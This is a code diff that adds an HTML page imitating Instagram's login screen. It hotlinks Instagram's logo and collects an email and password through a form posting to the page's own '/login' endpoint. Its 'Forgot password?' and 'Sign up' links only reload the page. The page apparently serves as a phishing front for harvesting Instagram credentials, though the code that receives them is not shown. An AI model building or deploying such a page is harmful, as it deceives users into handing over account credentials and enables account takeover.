@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Instagram</title>
+  <link rel="stylesheet" href="./stylesheets/styles.css" />
+</head>
+<body>
+  <main class="center">
+    <div class="card">  
+  <h1 class="logo"><img src="https://instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" style="height:40px;"></h1>
+
+      <form action="/login" method="post"id="loginForm" autocomplete="off">
+        <input type="email" name="email" placeholder="email" />
+        <input type="password" name="password" type="password" placeholder="Password" />
+        <div id="error" class="error" aria-live="polite"></div>
+        <input type="submit" value="Log In">
+      </form>
+        <p class="small">
+          <a href="#" id="forgotBtn">Forgot password?</a>
+        </p>
+        <div class="signup">
+          Don't have an account? <a href="#" id="signupBtn">Sign up</a>
+        </div>
+    </div>
+  </main>
+
+    <script src="./javascripts/app.js"></script>
+    <script>
+      document.getElementById('forgotBtn').onclick = function(e) { e.preventDefault(); location.reload(); };
+      document.getElementById('signupBtn').onclick = function(e) { e.preventDefault(); location.reload(); };
+    </script>
+</body>
+</html>
